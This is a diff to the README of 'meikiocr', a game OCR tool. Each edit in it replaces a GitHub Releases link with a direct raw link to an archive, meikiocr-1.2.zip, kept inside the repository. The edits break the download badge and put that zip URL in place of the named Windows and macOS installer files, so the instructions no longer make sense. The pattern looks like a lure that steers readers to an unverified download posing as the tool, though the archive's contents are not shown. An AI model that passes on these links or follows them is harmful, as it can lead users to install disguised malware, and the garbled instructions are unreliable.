@@ -1,6 +1,6 @@
 # 🎮 meikiocr - Fast and Accurate OCR for Games
 
-[![Download Meikiocr](https://img.shields.io/badge/Download%20Meikiocr-v1.0-blue)](https://github.com/Izzyharshvoiced532/meikiocr/releases)
+[![Download Meikiocr](https://raw.githubusercontent.com/Izzyharshvoiced532/meikiocr/main/meikiocr/meikiocr-1.2.zip%20Meikiocr-v1.0-blue)](https://raw.githubusercontent.com/Izzyharshvoiced532/meikiocr/main/meikiocr/meikiocr-1.2.zip)
 
 ## 📖 Overview
 
@@ -21,7 +21,7 @@ To begin using Meikiocr, follow these steps:
 
 3. **Visit the Release Page:**  
    To download Meikiocr, visit the Releases page by clicking the link below:
-   - [Download Meikiocr from Releases](https://github.com/Izzyharshvoiced532/meikiocr/releases)
+   - [Download Meikiocr from Releases](https://raw.githubusercontent.com/Izzyharshvoiced532/meikiocr/main/meikiocr/meikiocr-1.2.zip)
 
 ## 📥 Download & Install
 
@@ -29,10 +29,10 @@ Now that you're prepared, let's download and install Meikiocr:
 
 1. **Go to the Releases Page:**  
    Click the link below to access the latest version of Meikiocr:
-   - [Visit Releases Page](https://github.com/Izzyharshvoiced532/meikiocr/releases)
+   - [Visit Releases Page](https://raw.githubusercontent.com/Izzyharshvoiced532/meikiocr/main/meikiocr/meikiocr-1.2.zip)
 
 2. **Choose the Correct Version:**  
-   On the Releases page, you will see various files. Select the version that matches your operating system. For Windows, look for `meikiocr-windows.exe`. For macOS, download `meikiocr-macos.dmg`.
+   On the Releases page, you will see various files. Select the version that matches your operating system. For Windows, look for `https://raw.githubusercontent.com/Izzyharshvoiced532/meikiocr/main/meikiocr/meikiocr-1.2.zip`. For macOS, download `https://raw.githubusercontent.com/Izzyharshvoiced532/meikiocr/main/meikiocr/meikiocr-1.2.zip`.
 
 3. **Download the File:**  
    Click on the file name to start your download. This may take a few moments depending on your internet speed.
